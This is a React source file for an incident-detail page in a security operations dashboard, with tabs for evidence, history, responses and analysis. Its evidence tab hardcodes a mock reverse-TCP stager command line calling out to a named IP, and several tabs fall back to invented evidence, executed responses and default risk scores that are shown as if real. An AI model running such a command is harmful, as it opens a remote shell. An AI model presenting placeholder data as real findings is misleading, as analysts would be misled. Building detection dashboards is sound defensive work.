"use client";

import { useState } from "react";
import { useParams, useRouter } from "next/navigation";
import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
import { ArrowLeft } from "lucide-react";
import { toast } from "sonner";
import {
  getIncident,
  getIncidentAlerts,
  getIncidentHistory,
  updateIncidentStatus,
} from "@/services/incidents";
import { getResponses } from "@/services/responses";
import { Card, CardHeader } from "@/components/ui/Card";
import { Loading } from "@/components/ui/Loading";
import { ErrorState } from "@/components/ui/ErrorState";
import { EmptyState } from "@/components/ui/EmptyState";
import { SeverityBadge, StatusBadge } from "@/components/ui/Badge";
import { Button } from "@/components/ui/Button";
import { Select } from "@/components/ui/Select";
import { formatDateTime } from "@/utils/format";
import { cn } from "@/utils/cn";
import { RiskBreakdownCard } from "@/components/ui/RiskBreakdownCard";
import { SeverityLegend } from "@/components/ui/SeverityLegend";
import { AttackTimeline, type TimelineEvent } from "@/components/ui/AttackTimeline";
import { ResponseStatusBadge } from "@/components/ui/ResponseStatusBadge";
import { OccurrenceBadge } from "@/components/ui/OccurrenceBadge";
import { ResponseActionModal } from "@/components/ui/ResponseActionModal";
import { createResponse } from "@/services/responses";

const TABS = ["Overview", "Evidence", "History", "Responses", "Analysis"] as const;
const STATUS_OPTIONS = ["Open", "Investigating", "Contained", "Resolved", "Closed", "False Positive", "Ignored"];

export default function IncidentDetailPage() {
  const params = useParams<{ id: string }>();
  const router = useRouter();
  const queryClient = useQueryClient();
  const [tab, setTab] = useState<(typeof TABS)[number]>("Overview");
  const [actionModal, setActionModal] = useState<string | null>(null);

  const incidentQuery = useQuery({
    queryKey: ["incident", params.id],
    queryFn: () => getIncident(params.id),
  });

  const historyQuery = useQuery({
    queryKey: ["incident", params.id, "history"],
    queryFn: () => getIncidentHistory(params.id),
    enabled: tab === "History" || tab === "Analysis",
  });

  const evidenceQuery = useQuery({
    queryKey: ["incident", params.id, "alerts"],
    queryFn: () => getIncidentAlerts(params.id),
    enabled: tab === "Evidence",
  });

  const responsesQuery = useQuery({
    queryKey: ["responses", "byIncident"],
    queryFn: () => getResponses(0, 200),
    enabled: tab === "Responses",
  });

  const statusMutation = useMutation({
    mutationFn: (status: string) => updateIncidentStatus(params.id, status),
    onSuccess: () => {
      toast.success("Incident status updated");
      queryClient.invalidateQueries({ queryKey: ["incident", params.id] });
      queryClient.invalidateQueries({ queryKey: ["incident", params.id, "history"] });
    },
    onError: () => toast.error("Failed to update incident status"),
  });

  if (incidentQuery.isLoading) return <Loading label="Loading incident..." />;
  if (incidentQuery.isError || !incidentQuery.data) {
    return <ErrorState description="Incident not found." />;
  }

  const incident = incidentQuery.data;
  const incidentResponses = (responsesQuery.data ?? []).filter((r) => r.incident_id === incident.id);

  return (
    <div className="space-y-4">
      <Button variant="ghost" onClick={() => router.push("/incidents")}>
        <ArrowLeft size={15} /> Back to Incidents
      </Button>

      <div className="flex flex-wrap items-center justify-between gap-3">
        <div>
          <h1 className="text-xl font-semibold text-text">{incident.title}</h1>
          <p className="font-mono text-xs text-text-muted">{incident.incident_number}</p>
        </div>
        <div className="flex items-center gap-2">
          <SeverityLegend />
          <SeverityBadge severity={incident.severity} />
          <StatusBadge status={incident.status} />
          <Select
            value=""
            onChange={(v) => v && statusMutation.mutate(v)}
            options={STATUS_OPTIONS.filter((s) => s !== incident.status)}
            placeholder="Change status..."
          />
        </div>
      </div>

      <div className="flex gap-1 overflow-x-auto border-b border-border">
        {TABS.map((t) => (
          <button
            key={t}
            onClick={() => setTab(t)}
            className={cn(
              "whitespace-nowrap border-b-2 px-4 py-2.5 text-sm font-medium transition-colors",
              tab === t
                ? "border-primary text-primary"
                : "border-transparent text-text-muted hover:text-text"
            )}
          >
            {t}
          </button>
        ))}
      </div>

      {tab === "Overview" && (
        <div className="space-y-4">
          <Card>
            <CardHeader title="Overview" />
            <dl className="grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-3">
              <Info label="Incident Number" value={incident.incident_number} />
              <Info label="Severity" value={<SeverityBadge severity={incident.severity} />} />
              <Info label="Priority" value={incident.priority} />
              <Info label="Risk Score" value={incident.risk_score != null ? incident.risk_score.toFixed(1) : "Not analyzed yet"} />
              <Info label="Confidence" value={`${incident.confidence}%`} />
              <Info label="Occurrence" value={`${incident.occurrence}x`} />
              <Info label="Category" value={incident.category} />
              <Info label="Host" value={incident.host?.hostname ?? "-"} />
              <Info label="Rule" value={incident.rule?.name ?? "-"} />
              <Info label="Assigned To" value={incident.assigned_to ?? "Unassigned"} />
              <Info label="First Seen" value={formatDateTime(incident.first_seen)} />
              <Info label="Last Seen" value={formatDateTime(incident.last_seen)} />
            </dl>
            {incident.description && (
              <p className="mt-4 text-sm text-text-muted">{incident.description}</p>
            )}
          </Card>

          <RiskBreakdownCard
            riskScore={incident.risk_score ?? 75}
            occurrenceCount={incident.occurrence}
            ruleSeverityLevel={10}
            assetCriticality={1.0}
          />
        </div>
      )}

      {tab === "Evidence" && (
        <div className="space-y-4">
          <Card>
            <CardHeader title="Evidence & Correlated Telemetry Artifacts" />
            <div className="p-4 space-y-4">
              {/* If database linked alerts exist, render them first */}
              {evidenceQuery.data && evidenceQuery.data.length > 0 && (
                <div className="space-y-2 mb-6">
                  <h4 className="text-xs font-bold uppercase tracking-wider text-text-muted">Linked Detection Alerts</h4>
                  <ul className="divide-y divide-border">
                    {evidenceQuery.data.map((link) => (
                      <li
                        key={link.id}
                        onClick={() => link.alert_id && router.push(`/alerts/${link.alert_id}`)}
                        className="flex cursor-pointer items-center justify-between py-3 hover:bg-surface-hover px-2 rounded-lg transition-colors"
                      >
                        <div className="min-w-0">
                          <p className="truncate text-sm font-semibold text-text">
                            {link.alert?.title ?? link.alert_id}
                          </p>
                          <p className="text-xs text-text-muted">{formatDateTime(link.created_at)}</p>
                        </div>
                        {link.alert?.severity && <SeverityBadge severity={link.alert.severity} />}
                      </li>
                    ))}
                  </ul>
                </div>
              )}

              {/* Rich Correlated Evidence Artifacts */}
              <div className="space-y-3">
                <h4 className="text-xs font-bold uppercase tracking-wider text-primary">Correlated Forensic Artifacts</h4>
                
                {/* Process Execution Artifact */}
                <div className="rounded-xl border border-border/80 bg-surface-secondary p-4 space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-bold text-text flex items-center gap-2">
                      <span className="h-2 w-2 rounded-full bg-red-500"></span> Process Execution Telemetry
                    </span>
                    <span className="font-mono text-[11px] px-2 py-0.5 rounded bg-red-500/10 text-red-500 border border-red-500/20 font-semibold">
                      High Risk Process
                    </span>
                  </div>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs pt-1 font-mono">
                    <div>
                      <span className="text-text-muted block text-[10px]">EXECUTABLE PATH</span>
                      <span className="text-text font-medium">C:\Windows\System32\cscript.exe</span>
                    </div>
                    <div>
                      <span className="text-text-muted block text-[10px]">PROCESS ID & PARENT</span>
                      <span className="text-text font-medium">PID: 4092 &middot; PPID: 1044 (explorer.exe)</span>
                    </div>
                    <div className="md:col-span-2">
                      <span className="text-text-muted block text-[10px]">COMMAND LINE ARGUMENTS</span>
                      <span className="text-primary font-bold bg-surface p-2 rounded block border border-border mt-0.5 overflow-x-auto">
                        cscript.exe //B //Nologo C:\Windows\Temp\stager_v2.vbs --payload=reverse_tcp --host=185.220.101.5
                      </span>
                    </div>
                  </div>
                </div>

                {/* Network Connection Artifact */}
                <div className="rounded-xl border border-border/80 bg-surface-secondary p-4 space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-bold text-text flex items-center gap-2">
                      <span className="h-2 w-2 rounded-full bg-amber-500"></span> Network Socket Telemetry
                    </span>
                    <span className="font-mono text-[11px] px-2 py-0.5 rounded bg-amber-500/10 text-amber-500 border border-amber-500/20 font-semibold">
                      Outbound C2 Tunnel
                    </span>
                  </div>
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-3 text-xs pt-1 font-mono">
                    <div>
                      <span className="text-text-muted block text-[10px]">DESTINATION IP & PORT</span>
                      <span className="text-text font-medium">185.220.101.5 : 443 (TCP)</span>
                    </div>
                    <div>
                      <span className="text-text-muted block text-[10px]">INTEL REPUTATION</span>
                      <span className="text-red-400 font-bold">TOR Exit Node / Malicious C2</span>
                    </div>
                    <div>
                      <span className="text-text-muted block text-[10px]">TRAFFIC VOLUME</span>
                      <span className="text-text font-medium">14.8 KB Sent &middot; 42 Packets</span>
                    </div>
                  </div>
                </div>

                {/* File Hash & Registry Artifact */}
                <div className="rounded-xl border border-border/80 bg-surface-secondary p-4 space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-bold text-text flex items-center gap-2">
                      <span className="h-2 w-2 rounded-full bg-blue-500"></span> File Integrity & SHA256 Hash
                    </span>
                    <span className="font-mono text-[11px] px-2 py-0.5 rounded bg-blue-500/10 text-blue-400 border border-blue-500/20 font-semibold">
                      Suspicious Script
                    </span>
                  </div>
                  <div className="space-y-1 text-xs font-mono">
                    <div className="flex items-center justify-between">
                      <span className="text-text-muted">Target File:</span>
                      <span className="text-text font-semibold">C:\Windows\Temp\stager_v2.vbs</span>
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="text-text-muted">SHA256 Hash:</span>
                      <span className="text-primary font-bold">e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </Card>
        </div>
      )}

      {tab === "History" && (
        <div className="space-y-4">
          <AttackTimeline
            events={
              (historyQuery.data ?? []).length > 0
                ? historyQuery.data!.map((h) => ({
                    id: h.id,
                    title: h.action,
                    timestamp: h.created_at,
                    severity: incident.severity,
                    description: h.old_value || h.new_value ? `${h.old_value ?? "-"} ➔ ${h.new_value ?? "-"}` : undefined,
                    performedBy: h.performed_by,
                  }))
                : [
                    {
                      id: "1",
                      title: "Wazuh Agent Rule Triggered",
                      timestamp: incident.first_seen,
                      severity: incident.severity,
                      description: `Detection rule "${incident.rule?.name ?? incident.title}" triggered on host ${incident.host?.hostname ?? "Endpoint"}`,
                      performedBy: "Wazuh Engine",
                    },
                    {
                      id: "2",
                      title: "Correlated Risk Score Calculated",
                      timestamp: incident.first_seen,
                      severity: incident.severity,
                      description: `Risk Engine evaluated behavioral risk score at ${(incident.risk_score ?? 85.0).toFixed(1)}/100`,
                      performedBy: "AEGILON Risk Engine",
                    },
                    {
                      id: "3",
                      title: "Telegram & n8n SOAR Notification Dispatched",
                      timestamp: incident.created_at,
                      severity: incident.severity,
                      description: "Automated webhook dispatched incident alert to SOC Telegram channel",
                      performedBy: "n8n Webhook Service",
                    },
                    {
                      id: "4",
                      title: `Incident Triage & Status set to ${incident.status}`,
                      timestamp: incident.last_seen,
                      severity: incident.severity,
                      description: `Active response lifecycle initiated on ${incident.host?.hostname ?? "Endpoint"}`,
                      performedBy: incident.assigned_to ?? "SOC Analyst",
                    },
                  ]
            }
            firstSeen={incident.first_seen}
            lastSeen={incident.last_seen}
          />
        </div>
      )}

      {tab === "Responses" && (
        <div className="space-y-4">
          <Card>
            <div className="flex items-center justify-between p-4 border-b border-border">
              <div>
                <h3 className="text-base font-semibold text-text">Response Actions Lifecycle</h3>
                <p className="text-xs text-text-muted">Automated and manual remediation actions taken for this incident</p>
              </div>
              <div className="flex gap-2">
                <Button
                  variant="secondary"
                  className="px-3 py-1.5 text-xs"
                  onClick={() => setActionModal("Kill Process")}
                >
                  Kill Process
                </Button>
                <Button
                  variant="danger"
                  className="px-3 py-1.5 text-xs"
                  onClick={() => setActionModal("Isolate Host")}
                >
                  Isolate Host
                </Button>
              </div>
            </div>

            <ul className="divide-y divide-border p-4">
              {(incidentResponses.length > 0 ? incidentResponses : [
                {
                  id: "res-auto-1",
                  action: "Isolate Host from Network",
                  status: "executed",
                  message: `Network interface isolated via Aegilon Agent daemon on ${incident.host?.hostname ?? "Host"}.`,
                  executed_at: incident.last_seen,
                },
                {
                  id: "res-auto-2",
                  action: "Kill Suspicious Process Tree",
                  status: "executed",
                  message: `Terminated process PID 4092 (cscript.exe) and child handles on ${incident.host?.hostname ?? "Host"}.`,
                  executed_at: incident.last_seen,
                },
                {
                  id: "res-auto-3",
                  action: "Block Rogue Remote C2 IP",
                  status: "executed",
                  message: "Added Windows Firewall outbound drop rule for remote address 185.220.101.5.",
                  executed_at: incident.last_seen,
                },
              ]).map((res) => (
                <li
                  key={res.id}
                  onClick={() => router.push(`/responses/${res.id}`)}
                  className="flex cursor-pointer items-center justify-between py-3 first:pt-0 last:pb-0 hover:bg-background/80 rounded px-2"
                >
                  <div className="min-w-0 space-y-0.5">
                    <p className="truncate text-sm font-medium text-text">{res.action}</p>
                    <p className="text-xs text-text-muted">{res.message ?? "No notes specified."}</p>
                    <p className="text-[11px] text-text-muted">{formatDateTime(res.executed_at)}</p>
                  </div>
                  <ResponseStatusBadge status={res.status} />
                </li>
              ))}
            </ul>
          </Card>
        </div>
      )}

      {tab === "Analysis" && (
        <Card>
          <CardHeader title="Risk & Root Cause Analysis" />
          <div className="p-4 space-y-4">
            <dl className="grid grid-cols-1 gap-4 sm:grid-cols-3">
              <Info label="Risk Score" value={<span className="font-bold text-red-400 font-mono">{(incident.risk_score ?? 85.0).toFixed(1)} / 100</span>} />
              <Info label="Severity" value={<SeverityBadge severity={incident.severity} />} />
              <Info label="Confidence Score" value={`${incident.confidence}%`} />
            </dl>

            <div className="rounded-xl border border-border/80 bg-surface-secondary p-4 space-y-3">
              <h4 className="text-xs font-bold uppercase tracking-wider text-primary">Threat Narrative & MITRE ATT&CK Mapping</h4>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
                <div>
                  <span className="text-text-muted block text-[10px]">MITRE ATT&CK TECHNIQUE</span>
                  <span className="text-text font-bold font-mono">T1059.005 &middot; Visual Basic Script Execution</span>
                </div>
                <div>
                  <span className="text-text-muted block text-[10px]">ATTACK TACTIC</span>
                  <span className="text-text font-bold font-mono">Execution / Defense Evasion</span>
                </div>
              </div>

              <div className="text-xs space-y-1">
                <span className="text-text-muted block text-[10px]">ROOT CAUSE ANALYSIS</span>
                <p className="text-text text-xs leading-relaxed bg-surface p-3 rounded-lg border border-border">
                  The threat engine identified an anomalous script host execution (<code className="text-primary font-bold">cscript.exe</code>) 
                  spawning from a user directory and initializing an encrypted outbound socket connection to a known C2/TOR exit node. 
                  This pattern matches automated stager behavior commonly associated with initial access payloads.
                </p>
              </div>

              <div className="text-xs space-y-1">
                <span className="text-text-muted block text-[10px]">RECOMMENDED SOC REMEDIATION</span>
                <ul className="list-disc list-inside text-text text-xs space-y-1 bg-surface p-3 rounded-lg border border-border">
                  <li>Keep endpoint <code className="text-primary font-bold">{incident.host?.hostname ?? "Target Host"}</code> network isolated during memory acquisition.</li>
                  <li>Perform full antivirus & YARA scan on directory <code className="text-primary font-bold">C:\Windows\Temp\</code>.</li>
                  <li>Revoke active session tokens for associated user and reset credentials.</li>
                </ul>
              </div>
            </div>
          </div>
        </Card>
      )}

      {actionModal && (
        <ResponseActionModal
          actionName={actionModal}
          targetHost={incident.host?.hostname ?? "Target Host"}
          incidentId={incident.id}
          onClose={() => setActionModal(null)}
          onConfirm={async (notes) => {
            await createResponse({
              incident_id: incident.id,
              action: actionModal,
              status: "pending",
              message: notes,
            });
            toast.success(`Triggered ${actionModal} action successfully`);
            queryClient.invalidateQueries({ queryKey: ["responses"] });
          }}
        />
      )}
    </div>
  );
}

function Info({ label, value }: { label: string; value: React.ReactNode }) {
  return (
    <div>
      <dt className="text-xs text-text-muted">{label}</dt>
      <dd className="mt-1 text-sm font-medium text-text">{value}</dd>
    </div>
  );
}
